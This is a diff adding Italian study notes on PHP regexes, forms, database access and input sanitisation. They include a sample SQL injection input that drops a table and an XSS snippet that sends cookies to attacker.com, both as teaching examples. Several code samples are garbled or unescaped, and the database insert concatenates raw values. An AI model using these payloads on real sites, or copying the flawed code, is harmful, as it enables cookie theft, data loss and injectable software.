@@ -496,4 +496,234 @@ for($num = $result->num_rows - 1; $num >= 0; $num--){
 - `mysqli_affected_rows`
 	- Restituisce il numero di righe alterate da INSERT, UPDATE, REPLACE o DELETE
 ## Espressioni regolari
-47 / 77
+- Uno dei punti di forza di Perl è rappresentato dalla facilità con cui è possibile testare l'occorrenza di una sotto stringa in una stringa.
+- In PHP ci sono le Perl Compatible Regular Expression
+- Specificano un *pattern* da ricercare in una stringa, cioè una sotto-stringa specifica o, più in generale una categoria di sotto-stringhe
+- `int preg_match($pattern, $stringa)`: operatore di corrispondenza, ritorna 1 se viene trovato il match, 0 viceversa
+- `/^([\w\-\+\.]+)\@([\w\-\+\.]+)\.([\w\-\+\.]+)$/;`
+#### Caratteri speciali e quantificatori
+Simbolo | Descrizione
+--------|------------
+`.` | Qualsiasi carattere tranne fine riga
+`[aeiou]` | Classe di caratteri che identifica una vocaleù
+`[a-h]` | Classe di caratteri che identifica lettere dalla *a* all'*h*
+`^` | Inverso del set che lo segue: `^[aeiou]`
+`/a{4}/` | a ripetuta 4 volte; {n,} almeno n volte
+`*` | 0 o più ripetizioni
+`+` | 1 o più ripetizioni
+`?` | 0 o 1 elemento
+##### Classi predefinite
+Simbolo | Definizione
+-----| ----
+\d | Carattere numerico
+\D | Carattere non numerico
+\w | Carattere alfanumerico
+\W | Carattere non alfanumerico
+\s | Spazio o tabulazione
+\S | Qualunque carattere che non sia uno spazio o tabulazione
+#### Modificatori
+- `/Mario/i;` ha esito positivo anche se una variabile contiene la parola mario con una diversa capitalizzazione
+- `/^parola$/m;` ha esito positivo se una variabile contiene solo parola o anche un fine linea oltre alla parola
+- `/pattern/g;` trova tutte le occorrenze di un pattern
+````PHP
+if (preg_match("/php/i", "PHP è un linguaggio di scripting.")) {
+	echo "Trovato un match!";
+} else{
+	echo "Nessun match trovato";
+}
+````
+#### Operatori di sostituzioni
+- `preg_replace($pattern, $sostituzione, $stringa)`: cerca in $stringa il pattern o lo sostituisce con $sostituzione
+- $stringa e $sostituzione possono essere una stringa o un array
+````PHP
+<?php
+	$stringa = 'troppi   spazi';
+	$risultato = preg_replace('/\s/\s+/', '', $stringa);
+	echo $risulato;
+?>
+````
+- `str_replace($dasostituire, $sostituzione, $stringa)`: come sopra ma non usa espressioni regolari ma una semplice stringa
+## HTML per i form
+- `<form action="http://server/path/file.php" method="post">`
+- Metodo **GET**: è il predefinito, il browser allega la *stringa di query* all'url
+	- `http://server/path/file.php?parametro=valore`
+	- limite alla lunghezza della stringa (256 caratteri)
+	- vulnerabilità dell'accesso
+- Metodo **POST**: la stringa di query viene passato come input standard
+	- maggiore facilità di gestione
+#### Formato della stringa di query
+- Contiene i dati inviati cliccando il pulsante *Submit*
+- Il nome e il valore di ciascun elemento della form sono codificati come assegnamenti
+- I caratteri speciali sono codificati sottoforma di numeri esadecimali preceduti da %
+	- Lo spazio è rappresentato da %20
+	- Nome = Mario%20Rossi
+- PHP rimuove i caratteri speciali automaticamente
+##### Gestione dei parametri
+- PHP salva i parametri in tre variabili diverse:
+	- Se si usa il metodo *GET* la stringa viene inserita dal server nella variabile superglobale `$_GET`
+	- Se si usa il metodo *POST* i dati si trovano nell'array associativo superglobale `$_POST`
+	- I dati vengono salvati sempre sull'array delle richieste `$_REQUEST`
+		- In questo modo lo script non deve sapere il metodo utilizzato, e non deve essere cambiato se cambiato se cambia il metodo utilizzato
+	- **Attenzione**: `$_REQUEST` è una variabile diversa da `$_POST` e `$_GET`, quindi la sua modifica non influenza le altre e viceversa
+##### Un esempio completo: dati da un database
+- Per stampare dati estratti da un DB le operazioni necessarie sono:
+	1. Apro una connessione con il database
+	2. Estraggo i dati
+	3. Stampo la pagina con i dati o il messaggio di errore
+	4. Chiudo la sessione
+````PHP
+include "connessione.php"; //inclusione del file di connessione
+echo file_get_contents("inizio.txt"); //stampo l'inizio pagina
+if(!$result = $connessione->query("SELECT * FROM raccolte*")){
+	echo "ERRORE della query:" . $connessione->error.".";
+	exit();
+}else{ //stampa dei record nella tabella
+	if($result->num_rows > 0){
+		//ciclo while per la stampa delle righe della tabella
+		$result->free(); //liberazione risorse occupate dalla query
+	} echo "</tbody></table>";
+}
+$connession->close(); //chiusura della connessione
+echo file_get_contents("pagine/fine.txt");
+````
+````PHP
+while($row = $result->fetch_array(MYSQLI_ASSOC)){
+	echo "<tr><th scope=\"row\">".$row['materiale']."</th>";
+	echo "<td>" . $row['quantità']. "" . $row['unitaMisura']. "</td>";
+	echo "<td>" . $row['destinazione']."</td>";
+	echo "<td>" . $row['Note']."</td></tr>";
+}
+````
+````PHP
+# INSERIMENTO IN DB: pulizia input
+function pulisciInput($value){
+	//elimina gli spazi
+	$value = trim($value);
+	//rimuove tag html (non è sempre una buona idea)
+	$value = strip_tags($value);
+	//converte i caratteri speciali in entità html (ex. &it;)
+	$value = htmlentities($value);
+	return $value;
+}
+````
+##### Pericoli
+- Ogni volta che permettiamo all'utente di inserire dei dati in un DB ci esponiamo a diversi attacchi
+- Gli utenti vanno sempre considerati come potenziali **_utenti malevoli_**
+- Un tipico attacco è l'*SQL injection* che consiste nell'inserire codice SQL malevolo
+````SQL
+SELECT * FROM nomeTabella WHERE campo=$input
+
+$input='valore; DROP TABLE nomeTabella;'
+````
+**PROBLEMI RILEVATI**
+il codice precedente ha 2 problemi:
+1. Input non filtrato
+2. L'utente utilizzato per accedere al db non deve avere i permessi per rimuovere le tabelle
+Soluzioni:
+1. *Approccio filter input, escape output*
+2. Utente dedicato
+
+**_filterInput_**
+Filtra il contenuto di una variabile. *type* può contenere i valori:
+- `INPUT_GET, INPUT_POST, INPUT_COOKIE, INPUT_SERVER, INPUT_ENV`
+*var_name* è la variabile da filtrare e *filter* contiene il filtro.
+**COSTANTI PER LA SANIFICAZIONE DEI DATI**
+**FILTER_SANITIZE_EMAIL**: rimuove i caratteri non validi in un’email
+**FILTER_SANITIZE_ENCODED**: codifica la stringa come URL
+**FILTER_SANITIZE_MAGIC_QUOTES**: aggiunge un carattere `\` prima di ogni` ‘,",\ e NULL`
+**FILTER_SANITIZE_NUMBER_FLOAT**
+**FILTER_SANITIZE_NUMBER_INT**
+**FILTER_SANITIZE_SPECIAL_CHARS**: rimuove tutti i caratteri di escape HTML,` ‘, ",<,>,&` e i caratteri ASCII <32
+**FILTER_SANITIZE_FULL,SPECIAL_CHARS**: equivalente a `htmlspecialchars()`, converte i caratteri speciali in entità HTML
+**FILTER_SANITIZE_STRING**: rimuove i tag da una stringa
+**FILTER_SANITIZE_URL**: rimuove i caratteri non validi
+### Attacchi Cross-Site Scripting
+- Un attacco di tipo Cross-Site Scripting (XSS) consente di iniettare del codice maligno, di solito JavaScript, in una pagina web
+- Questo espone il sistema a vari tipi di attacchi
+````HTML
+<script> document.write(<iframe src="http://attacker.com? cookie' + document.cookie.escape()+'" height="0" width="0" />);
+</script>
+
+strip_tags($comment, $tagAmmessi);
+````
+#### Escape Output
+- abbiamo già visto l'utilizzo della funzione `strip_tags`
+- Un progetto interessante è HTML Purifier, che mette a disposizione una libreria per il filtro dei dati che rimuove attacchi di tipo XSS
+	- http://htmlpurifier.org
+- `htmlspecialchars(), htmlentities()`
+````PHP
+$new = htmlspecialchars("<a href='test'>Test</a>", ENT_QUOTES);
+echo $new;
+````
+#### Inserimento in DB: utilizzo oggetti
+````PHP
+class Materiale{
+	//proprietà
+	private $descr="";
+	private $quantita = 0;
+	private $unitaMisura = "unità";
+	private $destinazione = "";
+	private $note = "";
+	private $errore = "";
+	//costruttore ed altri metodi
+}
+
+function__construct($descr, $quant, $misura, $dest, $note){
+	$erroreDescr = $this->setDescrizione($descr);
+	$erroreQuant = $this->setQuantita($quant);
+	$erroreMisura = $this->setUnitaMisura($misura);
+	$erroreDest = $this->setDestinazione($dest);
+	$erroreNote = $this->setNote($note);
+
+	$this->errore = $erroreDescr.$erroreQuant.$erroreMisura.$erroreDest.$erroreNote;
+	$this->errore = $this->errore?"<ul>". $this->errore."</ul>":"";
+}
+
+public function__toString(){
+	return $this->errore;
+}
+//metodi per settare le proprietà
+private function setDescrizione($value){
+	$errore="";
+	(strlen($value)<=100) ? $this->descr = $value: errore ="<li> Formato descrizione del materiale non corretto </li>";
+	return $errore;
+}
+
+private function setQuantita($value)
+	(ctype_digit($value)&& strlen($value)<=10)?...
+
+private function setUnitaMisura($value)
+	(!(preg_match("/\d/", $value))&&strlen($value)<=20)...
+
+private function setDestinazione($value)
+	(strlen($value)<=100)..
+
+private function setNote($value)
+	(strlen($value)<=200)...
+
+//metodi per leggere le proprietà
+function getDescrizione(){
+	return $this->descr;
+}
+
+function getQuantita(){return $this->quantita;}
+function getUnitaMisura(){return $this->unitaMisura;}
+function getDestinazione(){return $this->destinazione;}
+function getNote() {return $this->note;}
+
+function save(){//connessione al DBMS
+	..
+	if($connessione->connect_errno){
+		throw new Exception ("Connessione fallitaa: ". $connessione->connect_error.".");
+		$connessione->connect_error.".");
+	}else{
+		$ins ="INSERT INTO raccolte(materiale, quantita, unitaMisura, destinazione, Note) VALUES (".$this->descr.",".$this->quantita...")";
+		if(!$connessione->query($ins)){
+			throw new Exception ("Errore:" ...);
+		}
+		$connessione->close();
+	}
+}
+````
+
+//slide 70/76
